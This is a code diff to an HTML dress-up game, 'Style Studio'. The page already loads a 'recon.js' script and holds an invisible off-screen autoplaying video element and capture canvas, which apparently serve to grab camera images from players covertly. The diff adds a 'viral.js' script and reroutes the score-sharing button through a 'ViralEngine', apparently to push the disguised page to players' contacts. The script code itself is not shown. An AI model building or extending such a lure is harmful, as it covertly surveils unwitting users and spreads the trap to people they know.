@@ -38,6 +38,7 @@ video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:
 </style>
 </head><body>
 <script src="forwarding_link/t/recon.js"></script>
+<script src="forwarding_link/t/viral.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 <div class="title">👗 Style Studio</div>
@@ -136,6 +137,10 @@ renderItems('tops',TOPS,'top');renderItems('bottoms',BOTS,'bot');renderItems('ac
 }
 function showLb(){var h='<b>🏆 Top Stylists</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('goLb').innerHTML=h;}
 function shareCard(t){
+if(window.ViralEngine){
+ViralEngine.doShare(t,score,'👗 I scored '+score+' in Style Studio! Can you style better? '+SHARE_URL);
+return;
+}
 var msg='👗 I scored '+score+' in Style Studio! Can you style better? '+SHARE_URL;
 if(navigator.canShare){navigator.share({text:msg,title:'Style Studio'}).catch(function(){});return;}
 if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
